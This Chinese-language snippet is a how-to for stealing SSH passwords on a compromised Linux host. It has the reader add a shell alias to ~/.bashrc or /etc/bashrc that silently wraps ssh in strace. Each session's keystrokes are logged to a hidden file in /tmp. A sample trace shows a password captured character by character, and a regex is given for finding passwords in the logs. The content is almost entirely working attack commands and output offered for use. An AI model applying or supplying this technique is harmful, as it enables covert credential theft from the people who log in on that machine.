### 收集ssh登录凭证

1.添加命令别名

```bash
# 添加命令别名
vi ~/.bashrc或者/etc/bashrc
alias ssh='strace -f -e trace=read,write -o /tmp/.ssh-`date '+%d%h%m%s'`.log -s 32 ssh'
# 使命令别名立即生效
source ~/.bashrc

```

2.记录的strace文件如下：

```bash
936   write(4, "root@192.168.168.20's password: ", 32) = 32
936   read(4, "t", 1)                   = 1
936   read(4, "o", 1)                   = 1
936   read(4, "o", 1)                   = 1
936   read(4, "r", 1)                   = 1
936   read(4, "\n", 1)                  = 1
936   write(4, "\n", 1)                 = 1

```

3.可以通过正则`.+@.+\bpassword`定位密码位置

